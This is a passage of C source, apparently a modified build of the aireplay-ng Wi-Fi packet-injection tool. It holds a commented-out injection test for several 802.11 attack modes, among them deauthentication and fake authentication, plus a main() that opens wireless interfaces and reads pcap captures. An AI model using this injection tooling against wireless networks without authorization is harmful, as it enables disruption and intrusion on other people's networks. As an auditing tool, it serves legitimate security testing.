//                //random bytes (as encrypted data)
//                for(j=0; j<7; j++)
//                    h80211[28+j] = rand() & 0xFF;
//
//                opt.f_iswep = -1;
//                opt.f_tods = 1; opt.f_fromds = 0;
//                opt.f_minlen = opt.f_maxlen = 24+4+7;
//            }
//
//            for(j=0; (j<(REQUESTS/4) && !k); j++) //try it 5 times
//            {
//                send_packet( h80211, opt.f_minlen );
//
//                gettimeofday( &tv, NULL );
//                while (1)  //waiting for relayed packet
//                {
//                    caplen = read_packet(packet, sizeof(packet), &ri);
//                    if ( filter_packet(packet, caplen) == 0 ) //got same length and same type
//                    {
//                        if(!answers)
//                        {
//                            answers++;
//                        }
//
//                        if(i == 0) //attack -0
//                        {
//                            if( h80211[0] == packet[0] )
//                            {
//                                k=1;
//                                break;
//                            }
//                        }
//                        else if(i==1) //attack -1 (open)
//                        {
//                            if( h80211[0] == packet[0] )
//                            {
//                                k=1;
//                                break;
//                            }
//                        }
//                        else if(i==2) //attack -1 (psk)
//                        {
//                            if( h80211[0] == packet[0] && memcmp(h80211+24, packet+24, caplen-24) == 0 )
//                            {
//                                k=1;
//                                break;
//                            }
//                        }
//                        else if(i==3) //attack -2/-3/-4/-6
//                        {
//                            if( h80211[0] == packet[0] && memcmp(h80211+24, packet+24, caplen-24) == 0 )
//                            {
//                                k=1;
//                                break;
//                            }
//                        }
//                        else if(i==4) //attack -5/-7
//                        {
//                            if( h80211[0] == packet[0] && memcmp(h80211+24, packet+24, caplen-24) == 0 )
//                            {
//                               if( (packet[1] & 0x04) && memcmp( h80211+22, packet+22, 2 ) == 0 )
//                               {
//                                    k=1;
//                                    break;
//                               }
//                            }
//                        }
//                    }
//
//                    gettimeofday( &tv2, NULL );
//                    if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (3*atime*1000)) //wait 3*'atime' ms for an answer
//                    {
//                        break;
//                    }
//                    usleep(10);
//                }
//            }
//            if(k)
//            {
//                k=0;
//                if(i==0) //attack -0
//                {
//                    PCT; printf("Attack -0:           OK\n");
//                }
//                else if(i==1) //attack -1 (open)
//                {
//                    PCT; printf("Attack -1 (open):    OK\n");
//                }
//                else if(i==2) //attack -1 (psk)
//                {
//                    PCT; printf("Attack -1 (psk):     OK\n");
//                }
//                else if(i==3) //attack -3
//                {
//                    PCT; printf("Attack -2/-3/-4/-6:  OK\n");
//                }
//                else if(i==4) //attack -5
//                {
//                    PCT; printf("Attack -5/-7:        OK\n");
//                }
//            }
//            else
//            {
//                if(i==0) //attack -0
//                {
//                    PCT; printf("Attack -0:           Failed\n");
//                }
//                else if(i==1) //attack -1 (open)
//                {
//                    PCT; printf("Attack -1 (open):    Failed\n");
//                }
//                else if(i==2) //attack -1 (psk)
//                {
//                    PCT; printf("Attack -1 (psk):     Failed\n");
//                }
//                else if(i==3) //attack -3
//                {
//                    PCT; printf("Attack -2/-3/-4/-6:  Failed\n");
//                }
//                else if(i==4) //attack -5
//                {
//                    PCT; printf("Attack -5/-7:        Failed\n");
//                }
//            }
//        }
//
//        if(!gotit && answers)
//        {
//            PCT; printf("Injection is working!\n");
//            if(opt.fast) return 0;
//            gotit=1;
//        }
//    }
    return 0;
}

int main( int argc, char *argv[] )
{
    int n, i, ret;

    /* check the arguments */

    memset( &opt, 0, sizeof( opt ) );
    memset( &dev, 0, sizeof( dev ) );

    opt.f_type    = -1; opt.f_subtype   = -1;
    opt.f_minlen  = -1; opt.f_maxlen    = -1;
    opt.f_tods    = -1; opt.f_fromds    = -1;
    opt.f_iswep   = -1; opt.ringbuffer  =  8;

    opt.r_fctrl     = -1;
    opt.ghost     =  0;
    opt.delay     = 15; opt.bittest     =  0;
    opt.fast      =  0; opt.r_smac_set  =  0;
    opt.npackets  =  1; opt.nodetect    =  0;
    opt.rtc       =  1; opt.f_retry	=  0;
    opt.reassoc   =  0;

/* XXX */
#if 0
#if defined(__FreeBSD__)
    /*
        check what is our FreeBSD version. injection works
        only on 7-CURRENT so abort if it's a lower version.
    */
    if( __FreeBSD_version < 700000 )
    {
        fprintf( stderr, "Aireplay-ng does not work on this "
            "release of FreeBSD.\n" );
        exit( 1 );
    }
#endif
#endif

    while( 1 )
    {
        int option_index = 0;

        static struct option long_options[] = {
            {"help",        0, 0, 'H'},
            {0,             0, 0,  0 }
        };

        int option = getopt_long( argc, argv,
                        "H",
                        long_options, &option_index );

        if( option < 0 ) break;

        switch( option )
        {
            case 0 :

                break;

            case ':' :

                printf("\"%s --help\" for help.\n", argv[0]);
                return( 1 );

            case '?' :

                printf("\"%s --help\" for help.\n", argv[0]);
                return( 1 );

            case 'H' :

                printf( usage, getVersion("Aireplay-ng", _MAJ, _MIN, _SUB_MIN, _REVISION, _BETA, _RC)  );
                return( 1 );

            default : goto usage;
        }
    }

    if( argc - optind != 1 )
    {
        if(argc == 1)
        {
usage:
            printf( usage, getVersion("Aireplay-ng", _MAJ, _MIN, _SUB_MIN, _REVISION, _BETA, _RC)  );
        }
        if( argc - optind == 0)
        {
            printf("No replay interface specified.\n");
        }
        if(argc > 1)
        {
            printf("\"%s --help\" for help.\n", argv[0]);
        }
        return( 1 );
    }

    if( (opt.f_minlen > 0 && opt.f_maxlen > 0) && opt.f_minlen > opt.f_maxlen )
    {
        printf( "Invalid length filter (min(-m):%d > max(-n):%d).\n",
                opt.f_minlen, opt.f_maxlen );
        printf("\"%s --help\" for help.\n", argv[0]);
        return( 1 );
    }

    if ( opt.f_tods == 1 && opt.f_fromds == 1 )
    {
        printf( "FromDS and ToDS bit are set: packet has to come from the AP and go to the AP\n" );
    }

    dev.fd_rtc = -1;

    /* open the RTC device if necessary */

#if defined(__i386__)
#if defined(linux)
    if (1)
    {
        if( ( dev.fd_rtc = open( "/dev/rtc0", O_RDONLY ) ) < 0 )
        {
            dev.fd_rtc = 0;
        }

        if( (dev.fd_rtc == 0) && ( ( dev.fd_rtc = open( "/dev/rtc", O_RDONLY ) ) < 0 ) )
        {
            dev.fd_rtc = 0;
        }
        if(opt.rtc == 0)
        {
            dev.fd_rtc = -1;
        }
        if(dev.fd_rtc > 0)
        {
            if( ioctl( dev.fd_rtc, RTC_IRQP_SET, RTC_RESOLUTION ) < 0 )
            {
                perror( "ioctl(RTC_IRQP_SET) failed" );
                printf(
                        "Make sure enhanced rtc device support is enabled in the kernel (module\n"
                        "rtc, not genrtc) - also try 'echo 1024 >/proc/sys/dev/rtc/max-user-freq'.\n" );
                close( dev.fd_rtc );
                dev.fd_rtc = -1;
            }
            else
            {
                if( ioctl( dev.fd_rtc, RTC_PIE_ON, 0 ) < 0 )
                {
                    perror( "ioctl(RTC_PIE_ON) failed" );
                    close( dev.fd_rtc );
                    dev.fd_rtc = -1;
                }
            }
        }
        else
        {
            printf( "For information, no action required:"
                    " Using gettimeofday() instead of /dev/rtc\n" );
            dev.fd_rtc = -1;
        }

    }
#endif /* linux */
#endif /* i386 */

    opt.iface_out = argv[optind];
    opt.port_out = get_ip_port(opt.iface_out, opt.ip_out, sizeof(opt.ip_out)-1);

    //don't open interface(s) when using test mode and airserv
    if (1)
    {
        /* open the replay interface */
        _wi_out = wi_open(opt.iface_out);
        if (!_wi_out)
            return 1;
        dev.fd_out = wi_fd(_wi_out);

        /* open the packet source */
        if( opt.s_face != NULL )
        {
            //don't open interface(s) when using test mode and airserv
            if (1)
            {
                _wi_in = wi_open(opt.s_face);
                if (!_wi_in)
                    return 1;
                dev.fd_in = wi_fd(_wi_in);
                wi_get_mac(_wi_in, dev.mac_in);
            }
        }
        else
        {
            _wi_in = _wi_out;
            dev.fd_in = dev.fd_out;

            /* XXX */
            dev.arptype_in = dev.arptype_out;
            wi_get_mac(_wi_in, dev.mac_in);
        }

        wi_get_mac(_wi_out, dev.mac_out);
    }

    /* drop privileges */
    if (setuid( getuid() ) == -1) {
        perror("setuid");
    }

    /* XXX */
    if( opt.r_nbpps == 0 )
    {
        if( dev.is_wlanng || dev.is_hostap )
            opt.r_nbpps = 200;
        else
            opt.r_nbpps = 500;
    }


    if( opt.s_file != NULL )
    {
        if( ! ( dev.f_cap_in = fopen( opt.s_file, "rb" ) ) )
        {
            perror( "open failed" );
            return( 1 );
        }

        n = sizeof( struct pcap_file_header );

        if( fread( &dev.pfh_in, 1, n, dev.f_cap_in ) != (size_t) n )
        {
            perror( "fread(pcap file header) failed" );
            return( 1 );
        }

        if( dev.pfh_in.magic != TCPDUMP_MAGIC &&
                dev.pfh_in.magic != TCPDUMP_CIGAM )
        {
            fprintf( stderr, "\"%s\" isn't a pcap file (expected "
                    "TCPDUMP_MAGIC).\n", opt.s_file );
            return( 1 );
        }

        if( dev.pfh_in.magic == TCPDUMP_CIGAM )
            SWAP32(dev.pfh_in.linktype);

        if( dev.pfh_in.linktype != LINKTYPE_IEEE802_11 &&
                dev.pfh_in.linktype != LINKTYPE_PRISM_HEADER &&
                dev.pfh_in.linktype != LINKTYPE_RADIOTAP_HDR &&
                dev.pfh_in.linktype != LINKTYPE_PPI_HDR )
        {
            fprintf( stderr, "Wrong linktype from pcap file header "
                    "(expected LINKTYPE_IEEE802_11) -\n"
                    "this doesn't look like a regular 802.11 "
                    "capture.\n" );
            return( 1 );
        }
    }

    //if there is no -h given, use default hardware mac
    if( maccmp( opt.r_smac, NULL_MAC) == 0 )
    {
        memcpy( opt.r_smac, dev.mac_out, 6);
        if (1)
        {
            printf("No source MAC (-h) specified. Using the device MAC (%02X:%02X:%02X:%02X:%02X:%02X)\n",
                    dev.mac_out[0], dev.mac_out[1], dev.mac_out[2], dev.mac_out[3], dev.mac_out[4], dev.mac_out[5]);
        }
    }

    if( maccmp( opt.r_smac, dev.mac_out) != 0 && maccmp( opt.r_smac, NULL_MAC) != 0)
    {
        //        if( dev.is_madwifi && opt.a_mode == 5 ) printf("For --fragment to work on madwifi[-ng], set the interface MAC according to (-h)!\n");
        fprintf( stderr, "The interface MAC (%02X:%02X:%02X:%02X:%02X:%02X)"
                " doesn't match the specified MAC (-h).\n"
                "\tifconfig %s hw ether %02X:%02X:%02X:%02X:%02X:%02X\n",
                dev.mac_out[0], dev.mac_out[1], dev.mac_out[2], dev.mac_out[3], dev.mac_out[4], dev.mac_out[5],
                opt.iface_out, opt.r_smac[0], opt.r_smac[1], opt.r_smac[2], opt.r_smac[3], opt.r_smac[4], opt.r_smac[5] );
    }

    return do_attack_test();
}
